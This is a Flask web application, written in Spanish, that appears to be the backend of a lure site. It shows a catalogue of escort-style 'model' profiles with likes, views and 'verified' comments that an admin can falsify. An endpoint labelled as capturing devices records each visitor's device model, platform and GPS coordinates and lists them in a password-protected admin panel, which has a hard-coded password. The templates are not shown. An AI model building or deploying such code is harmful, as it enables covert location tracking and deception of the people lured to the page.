import os
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'clave_secreta_super_segura'

UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# Listas en memoria
dispositivos_capturados = []
modelos_perfiles = [
    {
        "id": 1,
        "nombre": "Sofía Valentina",
        "fotos": ["https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=500"],
        "caracteristicas": "22 años, Exclusivo VIP, Idioma Español",
        "likes": 154,
        "vistas": 1420,
        "comentarios": ["¡Excelente atención y muy amable!", "100% real y recomendado."],
        "estado": "En línea 🟢"
    }
]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/guardar-datos', methods=['POST'])
def guardar_datos():
    data = request.get_json()
    print("\n--- NUEVO DISPOSITIVO CAPTURADO ---")
    print(f"Modelo: {data.get('modelo')}")
    print(f"Plataforma: {data.get('plataforma')}")
    print(f"Ubicación GPS -> Lat: {data.get('latitud')}, Lon: {data.get('longitud')}")

    dispositivos_capturados.append(data)
    return jsonify({"success": True})

@app.route('/catalogo')
def catalogo():
    return render_template('catalogo.html', modelos=modelos_perfiles)

@app.route('/api/like/<int:modelo_id>', methods=['POST'])
def dar_like(modelo_id):
    for m in modelos_perfiles:
        if m['id'] == modelo_id:
            m['likes'] += 1
            return jsonify({"success": True, "likes": m['likes']})
    return jsonify({"success": False}), 404

@app.route('/api/comentario/<int:modelo_id>', methods=['POST'])
def agregar_comentario(modelo_id):
    data = request.get_json()
    texto = data.get('comentario')
    if texto:
        for m in modelos_perfiles:
            if m['id'] == modelo_id:
                m['comentarios'].append(texto)
                return jsonify({"success": True, "comentarios": m['comentarios']})
    return jsonify({"success": False}), 400

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    error = None
    if request.method == 'POST':
        password = request.form.get('password')
        if password == '509087':
            session['admin_logged'] = True
            return redirect(url_for('admin'))
        else:
            error = "Contraseña incorrecta."

    if session.get('admin_logged'):
        return render_template('admin.html', dispositivos=dispositivos_capturados, modelos=modelos_perfiles)

    return render_template('admin.html', login_required=True, error=error)

@app.route('/admin/subir-modelo', methods=['POST'])
def subir_modelo():
    if not session.get('admin_logged'):
        return redirect(url_for('admin'))

    nombre = request.form.get('nombre')
    caracteristicas = request.form.get('caracteristicas')
    likes_iniciales = int(request.form.get('likes_iniciales', 50))
    vistas_iniciales = int(request.form.get('vistas_iniciales', 1200))
    archivos_fotos = request.files.getlist('fotos')

    urls_fotos = []
    for archivo in archivos_fotos:
        if archivo and archivo.filename != '':
            filename = secure_filename(archivo.filename)
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            archivo.save(filepath)
            urls_fotos.append(f"/static/uploads/{filename}")

    if nombre and urls_fotos:
        nuevo_id = len(modelos_perfiles) + 1
        modelos_perfiles.append({
            "id": nuevo_id,
            "nombre": nombre,
            "fotos": urls_fotos,
            "caracteristicas": caracteristicas or "Sin descripción",
            "likes": likes_iniciales,
            "vistas": vistas_iniciales,
            "comentarios": ["¡Perfil verificado y activo!"],
            "estado": "En línea 🟢"
        })

    return redirect(url_for('admin'))

@app.route('/admin/editar-likes/<int:modelo_id>', methods=['POST'])
def editar_likes(modelo_id):
    if not session.get('admin_logged'):
        return redirect(url_for('admin'))

    nuevos_likes = int(request.form.get('likes', 0))
    for m in modelos_perfiles:
        if m['id'] == modelo_id:
            m['likes'] = nuevos_likes
            break

    return redirect(url_for('admin'))

@app.route('/admin/editar-vistas/<int:modelo_id>', methods=['POST'])
def editar_vistas(modelo_id):
    if not session.get('admin_logged'):
        return redirect(url_for('admin'))

    nuevas_vistas = int(request.form.get('vistas', 0))
    for m in modelos_perfiles:
        if m['id'] == modelo_id:
            m['vistas'] = nuevas_vistas
            break

    return redirect(url_for('admin'))

@app.route('/admin/eliminar-modelo/<int:modelo_id>', methods=['POST'])
def eliminar_modelo(modelo_id):
    if not session.get('admin_logged'):
        return redirect(url_for('admin'))

    global modelos_perfiles
    modelos_perfiles = [m for m in modelos_perfiles if m['id'] != modelo_id]
    return redirect(url_for('admin'))

@app.route('/logout')
def logout():
    session.pop('admin_logged', None)
    return redirect(url_for('admin'))

import os

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
